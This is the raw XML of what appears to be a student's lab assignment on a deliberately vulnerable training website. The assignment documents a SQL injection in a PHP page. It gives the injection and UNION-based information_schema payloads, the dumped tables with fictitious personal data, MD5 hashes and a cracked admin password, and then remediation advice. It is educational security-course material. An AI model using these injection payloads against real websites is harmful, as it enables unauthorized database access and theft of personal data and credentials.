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urls" style:family="table">
      <style:table-properties style:width="6.9965in" fo:margin-left="0in" table:align="left"/>
    </style:style>
    <style:style style:name="Gurls.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.3736in"/>
    </style:style>
    <style:style style:name="Gurls.B" style:family="table-column">
      <style:table-column-properties style:column-width="0.6854in"/>
    </style:style>
    <style:style style:name="Gurls.C" style:family="table-column">
      <style:table-column-properties style:column-width="0.3819in"/>
    </style:style>
    <style:style style:name="Gurls.D" style:family="table-column">
      <style:table-column-properties style:column-width="0.7465in"/>
    </style:style>
    <style:style style:name="Gurls.E" style:family="table-column">
      <style:table-column-properties style:column-width="1.3111in"/>
    </style:style>
    <style:style style:name="Gurls.F" style:family="table-column">
      <style:table-column-properties style:column-width="1.1889in"/>
    </style:style>
    <style:style style:name="Gurls.G" style:family="table-column">
      <style:table-column-properties style:column-width="0.8771in"/>
    </style:style>
    <style:style style:name="Gurls.A1" style:family="table-cell">
      <style:table-cell-properties fo:padding="0.0382in" fo:border-left="0.05pt solid #000000" fo:border-right="none" fo:border-top="0.05pt solid #000000" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Gurls.I1" style:family="table-cell">
      <style:table-cell-properties fo:padding="0.0382in" fo:border="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Gurls.A2" style:family="table-cell">
      <style:table-cell-properties fo:padding="0.0382in" fo:border-left="0.05pt solid #000000" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Gurls.I2" style:family="table-cell">
      <style:table-cell-properties fo:padding="0.0382in" fo:border-left="0.05pt solid #000000" fo:border-right="0.05pt solid #000000" fo:border-top="none" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="news" style:family="table">
      <style:table-properties style:width="6.6931in" table:align="margins"/>
    </style:style>
    <style:style style:name="news.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.5819in" style:rel-column-width="838*"/>
    </style:style>
    <style:style style:name="news.B" style:family="table-column">
      <style:table-column-properties style:column-width="1.3542in" style:rel-column-width="1950*"/>
    </style:style>
    <style:style style:name="news.C" style:family="table-column">
      <style:table-column-properties style:column-width="2.691in" style:rel-column-width="3875*"/>
    </style:style>
    <style:style style:name="news.D" style:family="table-column">
      <style:table-column-properties style:column-width="1.1889in" style:rel-column-width="1712*"/>
    </style:style>
    <style:style style:name="news.E" style:family="table-column">
      <style:table-column-properties style:column-width="0.8771in" style:rel-column-width="1263*"/>
    </style:style>
    <style:style style:name="news.A1" style:family="table-cell">
      <style:table-cell-properties fo:padding="0.0382in" fo:border-left="0.05pt solid #000000" fo:border-right="none" fo:border-top="0.05pt solid #000000" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="news.E1" style:family="table-cell">
      <style:table-cell-properties fo:padding="0.0382in" fo:border="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="news.A2" style:family="table-cell">
      <style:table-cell-properties fo:padding="0.0382in" fo:border-left="0.05pt solid #000000" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="news.E2" style:family="table-cell">
      <style:table-cell-properties fo:padding="0.0382in" fo:border-left="0.05pt solid #000000" fo:border-right="0.05pt solid #000000" fo:border-top="none" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="users" style:family="table">
      <style:table-properties style:width="6.6931in" table:align="margins"/>
    </style:style>
    <style:style style:name="users.A" style:family="table-column">
      <style:table-column-properties style:column-width="2.2306in" style:rel-column-width="3212*"/>
    </style:style>
    <style:style style:name="users.B" style:family="table-column">
      <style:table-column-properties style:column-width="1.2681in" style:rel-column-width="1826*"/>
    </style:style>
    <style:style style:name="users.C" style:family="table-column">
      <style:table-column-properties style:column-width="3.1944in" style:rel-column-width="4600*"/>
    </style:style>
    <style:style style:name="us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users.C1" style:family="table-cell">
      <style:table-cell-properties fo:padding="0.0382in" fo:border="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="users.A2" style:family="table-cell">
      <style:table-cell-properties fo:padding="0.0382in" fo:border-left="0.05pt solid #000000" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="us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1eca" officeooo:paragraph-rsid="00161eca"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00161eca" officeooo:paragraph-rsid="00199f36"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00161eca" officeooo:paragraph-rsid="001a2693"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00170be0" officeooo:paragraph-rsid="00170be0"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00199f36" officeooo:paragraph-rsid="00199f36"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00199f36"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001a188e" officeooo:paragraph-rsid="001a188e"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Table_20_Contents">
      <style:text-properties officeooo:rsid="00170be0" officeooo:paragraph-rsid="00170be0"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Table_20_Contents">
      <style:text-properties officeooo:rsid="0018d6a0" officeooo:paragraph-rsid="0018d6a0"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Header">
      <style:text-properties officeooo:rsid="00161eca" officeooo:paragraph-rsid="00161eca"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="00161eca"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="00170be0"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="0018d6a0"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="00199f36"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="001a188e"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties officeooo:rsid="001a26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ee extras</text:p>
      <text:p text:style-name="P1"></text:p>
      <text:p text:style-name="P1">2. It is vulnerable in /nightclub/girldetail.php</text:p>
      <text:p text:style-name="P1">It takes one parameter (girl) that can be injected with sql. </text:p>
      <text:p text:style-name="P1">Example: Claudia' or '1'='1</text:p>
      <text:p text:style-name="P1">Will give all girl<text:span text:style-name="T4">s</text:span> in the bpr.girl table</text:p>
      <text:p text:style-name="P1"></text:p>
      <text:p text:style-name="P1">3. The tables: girls, users, news </text:p>
      <text:p text:style-name="P1">I first tried with "UNION ALL SELECT 1, 2, 3 FROM information_schema WHERE '1'='1"</text:p>
      <text:p text:style-name="P1">I got a <text:span text:style-name="T6">access</text:span> <text:span text:style-name="T6">declined</text:span> reply. </text:p>
      <text:p text:style-name="P3">I <text:span text:style-name="T6">realized</text:span> my error and modified the <text:span text:style-name="T6">query</text:span> to "Claudia' UNION ALL SELECT table_schema,table_name,null FROM information_schema.tables WHERE '1'='1".</text:p>
      <text:p text:style-name="P1">This gave me all the tables in the database, including system databases. </text:p>
      <text:p text:style-name="P1"></text:p>
      <text:p text:style-name="P1">4.</text:p>
      <text:p text:style-name="P4">girls table: </text:p>
      <table:table table:name="Gurls" table:style-name="Gurls">
        <table:table-column table:style-name="Gurls.A"/>
        <table:table-column table:style-name="Gurls.B"/>
        <table:table-column table:style-name="Gurls.C"/>
        <table:table-column table:style-name="Gurls.D"/>
        <table:table-column table:style-name="Gurls.E"/>
        <table:table-column table:style-name="Gurls.F"/>
        <table:table-column table:style-name="Gurls.G"/>
        <table:table-column table:style-name="Gurls.D"/>
        <table:table-column table:style-name="Gurls.B"/>
        <table:table-row>
          <table:table-cell table:style-name="Gurls.A1" office:value-type="string">
            <text:p text:style-name="P8">Id</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A1" office:value-type="string">
            <text:p text:style-name="P8">Nick</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A1" office:value-type="string">
            <text:p text:style-name="P8">Age</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A1" office:value-type="string">
            <text:p text:style-name="P8">Hair</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A1" office:value-type="string">
            <text:p text:style-name="P8">Name</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A1" office:value-type="string">
            <text:p text:style-name="P8">Adresa</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A1" office:value-type="string">
            <text:p text:style-name="P8">Mesto</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A1" office:value-type="string">
            <text:p text:style-name="P8">Psc</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.I1" office:value-type="string">
            <text:p text:style-name="P8">Rodne</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="P8">1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="P8">Cindy</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="P8">18</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Blonde</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Frantisek Novak</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Hlavni nadrazi</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Praha</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">99999</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.I2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">19915132/12</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="P8">2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="P8">Claudia</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="P8">18</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Brunette</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Marie Nepojmenovana</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Neexistujici 2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Wienerschnitzelberg</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">99999</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.I2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">19895230/99</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="P8">3</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="P8">Karin</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="P8">19</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">purple</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Jirina Fialova</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Neexistujici 365</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Brno</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">99999</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Gurls.I2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">19895230/00</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P4">News table: </text:p>
      <table:table table:name="news" table:style-name="news">
        <table:table-column table:style-name="news.A"/>
        <table:table-column table:style-name="news.B"/>
        <table:table-column table:style-name="news.C"/>
        <table:table-column table:style-name="news.D"/>
        <table:table-column table:style-name="news.E"/>
        <table:table-row>
          <table:table-cell table:style-name="news.A1" office:value-type="string">
            <text:p text:style-name="P8">id</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.A1" office:value-type="string">
            <text:p text:style-name="P8">title</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.A1" office:value-type="string">
            <text:p text:style-name="P8">text</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.A1" office:value-type="string">
            <text:p text:style-name="P8">date_inserted</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.E1" office:value-type="string">
            <text:p text:style-name="P8">visible</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="news.A2" office:value-type="string">
            <text:p text:style-name="P8">1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">MI-BPR Site Launched</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">The MI-BPR site was launched on Monday, 8th November 2011. Enjoy the stunning photos, parties and girls offered by the site!</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">2011-11-07 00:28:28</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.E2" office:value-type="string">
            <text:p text:style-name="P8">TRUE</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="news.A2" office:value-type="string">
            <text:p text:style-name="P8">2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">20% Discount to our VIP Members</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.A2" office:value-type="string">
            <text:p text:style-name="P8">We have a special Christmas offer for our valued customers. Rent a girl in December for the entire night and get another one for FREE!&lt;/p&gt;&lt;p&gt;See more details about this exclusive deal at &lt;a href="xmasdeal.php?file=xmasdeal.txt"&gt;here&lt;/a&gt;.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">2011-11-07 00:56:35</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.E2" office:value-type="string">
            <text:p text:style-name="P8">TRUE</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="news.A2" office:value-type="string">
            <text:p text:style-name="P8">3</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">You have earned 0.5 points</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">By changing the data you got access to a record which is marked invisible. Inform your teacher.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">2015-11-17 18:31:05</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.E2" office:value-type="string">
            <text:p text:style-name="P8">FALSE</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="news.A2" office:value-type="string">
            <text:p text:style-name="P8">10</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">You have earned 0.5 points</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Patience is a virtue. Inform your teacher.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">2015-11-17 18:31:25</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="news.E2" office:value-type="string">
            <text:p text:style-name="P8">FALSE</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P1"></text:p>
      <text:p text:style-name="P2"></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">users table</text:span></text:p>
      <table:table table:name="users" table:style-name="users">
        <table:table-column table:style-name="users.A"/>
        <table:table-column table:style-name="users.B"/>
        <table:table-column table:style-name="users.C"/>
        <table:table-row>
          <table:table-cell table:style-name="users.A1" office:value-type="string">
            <text:p text:style-name="P9">id</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="users.A1" office:value-type="string">
            <text:p text:style-name="P9">username</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="users.C1" office:value-type="string">
            <text:p text:style-name="P9">Passwor<text:span text:style-name="T5">d</text:span> (hash)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="users.A2" office:value-type="string">
            <text:p text:style-name="P9">1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="users.A2" office:value-type="string">
            <text:p text:style-name="P9">admin</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="users.C2" office:value-type="string">
            <text:p text:style-name="P9">76a76b8096aaaa1eec01ecc43c11bcac</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="users.A2" office:value-type="string">
            <text:p text:style-name="P9">2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="users.A2" office:value-type="string">
            <text:p text:style-name="P9">www</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="users.C2" office:value-type="string">
            <text:p text:style-name="P9">3ea4db050dfd4daa3a93e9434c468776</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P5">5.</text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T4">Admin password is : </text:span>kr8va</text:p>
      <text:p text:style-name="P5">Cracked with the help of rainbow tables from <text:a xlink:type="simple" xlink:href="http://md5cracker.org/">http://md5cracker.org/</text:a></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">6.</text:p>
      <text:p text:style-name="P7">If the club owner would have used prepared statements the vulnerabilities in <text:s/><text:span text:style-name="T1">girldetail.php </text:span>would not have been present. Prepared statements do not allow for injection since all inputs all checked. </text:p>
      <text:p text:style-name="P7">Also, the database user should not have access to any table in the <text:s/><text:span text:style-name="T1">information_schema </text:span>database. This will make injection slower and harder. The hacker will not have easy access to all the table names. This blocking is easily done in a SQL DBMS. </text:p>
      <text:p text:style-name="P7">If the SQL command “union” is not used by the website, it can be disabled since there is no normal use for it. This makes executing injections harder. </text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Using a outdated hash is <text:span text:style-name="T6">dangerous</text:span> and bad. Even worse with fact that is does not use a salt. Salt makes it so that rainbow tables is not as useful. </text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P1">Extras:</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T2">1. </text:span></text:p>
      <text:p text:style-name="P1">http://127.0.0.1:9999/nightclub/newsfeed.php?feed=3 gives the reply :</text:p>
      <text:p text:style-name="P1"></text:p>
      <text:p text:style-name="P1">You have earned 0.5 points</text:p>
      <text:p text:style-name="P1"></text:p>
      <text:p text:style-name="P1">By changing the data you got access to a record which is marked invisible. Inform your teacher.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P4">2.</text:p>
      <text:p text:style-name="P4"><text:a xlink:type="simple" xlink:href="http://127.0.0.1:9999/nightclub/newsfeed.php?feed=10">http://127.0.0.1:9999/nightclub/newsfeed.php?feed=10</text:a> gives the reply: </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">You have earned 0.5 points</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Patience is a virtue. Inform your teac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1eca" officeooo:paragraph-rsid="00161e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ustaf Nilstadius <text:tab/>Assignment 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7:53:17.385952130</meta:creation-date>
    <dc:date>2015-12-29T19:31:59.069234404</dc:date>
    <meta:editing-duration>PT1H34M14S</meta:editing-duration>
    <meta:editing-cycles>5</meta:editing-cycles>
    <meta:generator>LibreOffice/4.2.8.2$Linux_X86_64 LibreOffice_project/420m0$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="3" meta:image-count="0" meta:object-count="0" meta:page-count="2" meta:paragraph-count="109" meta:word-count="463" meta:character-count="2910" meta:non-whitespace-character-count="2511"/>
  </office:meta>
</office:document-meta>
</file>